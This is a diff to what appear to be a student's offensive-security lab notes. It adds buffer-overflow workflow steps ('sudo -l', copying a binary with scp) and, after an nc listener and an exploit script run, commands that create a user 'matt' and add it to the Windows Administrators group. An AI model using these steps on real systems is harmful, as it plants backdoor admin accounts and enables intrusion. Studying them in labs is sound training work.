@@ -366,8 +366,13 @@ peda plugin = highlighted red, vulnerable function
 
 
 ##Buffer Overflow
+#to find the exe
+sudo -l 
+#find it
+
 0. Run the program
 ./<exe>
+#scp to lin-ops to work on it
 
 1. Attempt to buffer overflow the program
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
@@ -514,6 +519,10 @@ student@lin-ops:~$ nc -lvp 4444
 
 #run script
 student@lin-ops:~$ python win_buffer_copy.py
+
+create a user
+net user matt password /add
+net localgroup Administrators matt /add
 
 
 ##POST EXPLOITATION (ENUMERATION) 
